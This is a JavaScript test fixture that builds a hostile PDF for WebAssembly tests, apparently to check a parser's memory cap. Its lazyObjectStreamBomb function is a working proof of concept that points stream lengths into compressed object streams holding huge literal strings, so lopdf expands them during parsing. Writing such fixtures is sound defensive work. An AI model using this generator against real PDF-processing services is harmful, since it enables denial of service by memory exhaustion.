// Hostile PDFs for the wasm tests, built in memory. lazyObjectStreamBomb is the merge council's PoC (H1c): each
// stream's /Length is a reference into an object stream, which lopdf decodes while parsing, outside the load hook's
// budget, so only the module's memory cap stops it.
import { deflateSync } from "node:zlib";

export function lazyObjectStreamBomb(containers = 24, literalBytes = 15_900_000) {
  const parts = [Buffer.from("%PDF-1.7\n%\xe2\xe3\xcf\xd3\n", "latin1")];
  let length = parts[0].length;
  const offsets = new Map();
  const put = (number, body) => {
    offsets.set(number, length);
    const chunk = Buffer.concat([Buffer.from(`${number} 0 obj\n`), body, Buffer.from("\nendobj\n")]);
    parts.push(chunk);
    length += chunk.length;
  };
  const text = (value) => Buffer.from(value, "latin1");
  put(1, text("<< /Type /Catalog /Pages 2 0 R >>"));
  put(2, text("<< /Type /Pages /Kids [3 0 R] /Count 1 >>"));
  put(3, text("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>"));
  put(4, text("<< /Length 13 >>\nstream\nBT (hi) Tj ET\nendstream"));
  const payload = "x".repeat(8);
  const carried = new Map();
  for (let i = 0; i < containers; i += 1) put(10 + i, text(`<< /Length ${2000 + i} 0 R >>\nstream\n${payload}\nendstream`));
  for (let i = 0; i < containers; i += 1) {
    const bodies = [[2000 + i, `${payload.length}`], [3000 + i, `(${"A".repeat(literalBytes)})`]];
    let header = "";
    let offset = 0;
    for (const [number, body] of bodies) {
      header += `${number} ${offset} `;
      offset += body.length + 1;
    }
    const raw = Buffer.from(header + bodies.map(([, body]) => `${body} `).join(""), "latin1");
    const compressed = deflateSync(raw, { level: 9 });
    put(1000 + i, Buffer.concat([text(`<< /Type /ObjStm /N 2 /First ${header.length} /Filter /FlateDecode /Length ${compressed.length} >>\nstream\n`), compressed, text("\nendstream")]));
    carried.set(2000 + i, [1000 + i, 0]);
    carried.set(3000 + i, [1000 + i, 1]);
  }
  const xrefNumber = 4000;
  const xrefOffset = length;
  const rows = [];
  const row = (type, a, b) => {
    const buffer = Buffer.alloc(7);
    buffer.writeUInt8(type, 0);
    buffer.writeUInt32BE(a, 1);
    buffer.writeUInt16BE(b, 5);
    rows.push(buffer);
  };
  row(0, 0, 65535);
  for (let number = 1; number <= xrefNumber; number += 1) {
    if (offsets.has(number)) row(1, offsets.get(number), 0);
    else if (carried.has(number)) row(2, ...carried.get(number));
    else if (number === xrefNumber) row(1, xrefOffset, 0);
    else row(0, 0, 0);
  }
  const compressedRows = deflateSync(Buffer.concat(rows), { level: 9 });
  parts.push(Buffer.concat([
    text(`${xrefNumber} 0 obj\n<< /Type /XRef /Size ${xrefNumber + 1} /Root 1 0 R /W [1 4 2] /Filter /FlateDecode /Length ${compressedRows.length} >>\nstream\n`),
    compressedRows,
    text(`\nendstream\nendobj\nstartxref\n${xrefOffset}\n%%EOF\n`),
  ]));
  return new Uint8Array(Buffer.concat(parts));
}
